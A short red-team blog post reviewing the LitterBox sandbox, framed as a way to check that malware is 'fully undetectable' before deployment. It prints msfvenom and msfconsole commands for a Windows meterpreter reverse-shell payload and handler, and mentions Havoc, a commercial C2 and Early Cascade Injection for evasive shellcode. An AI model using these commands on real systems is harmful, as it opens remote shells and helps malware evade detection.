---
layout: post
title: "LitterBox: The Sandbox for Malware Developers"
date: 2025-02-19 00:32:00 +0100
categories:
  - Red Team
  - Malware
author: kuom
---
It is important to test malware before deploying it to make sure it is FUD (Fully Undetectable) and it doesn't have any IoC (Indicator of Compromise). <br>
Lately I tried a nice [sandbox](https://github.com/BlackSnufkin/LitterBox). It offers both analysis and dynamic analysis, plus scanning a running process and doing memory analysis at runtime.
### Installation
Recommended on Windows; fairly simple: git clone and execute python litterbox.py.
### Samples
We will try different samples, from a basic meterpreter reverse shell to more advanced payloads.
The focus today is to test how this sandbox react and with different level C2 and different levels of evasiveness.
#### Meterpreter
```
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=<host> LPORT=<ip>
msfconsole
use exploit/multi/handler
set LPORT <port>
set LHOST <ip>
```
![](/assets/Screenshot-2025-01-21-161217.png)
![](/assets/Screenshot-2025-01-21-161301.png)
#### Havoc
Set up an https listener and generate a payload with the following options, this time we wll use the Active process sandbox capabilities
![](/assets/Screenshot-2025-01-21-151238.png)
##### Active Process Inspection
![](/assets/Screenshot-2025-01-21-162202.png)

![](/assets/Screenshot-2025-01-21-162224.png)

![](/assets/Screenshot-2025-01-21-162318.png)
#### Commercial C2
![](/assets/Pasted-image-20250122185634.png)
#### Early Cascade Injection + Meterpreter shellcode
For the last one, I will load the shellcode using the Early Cascade Injection technique. It seems fairly effective regarding evasiveness.
Read more [here](https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/).
![](/assets/Pasted-image-20250122184535.png)
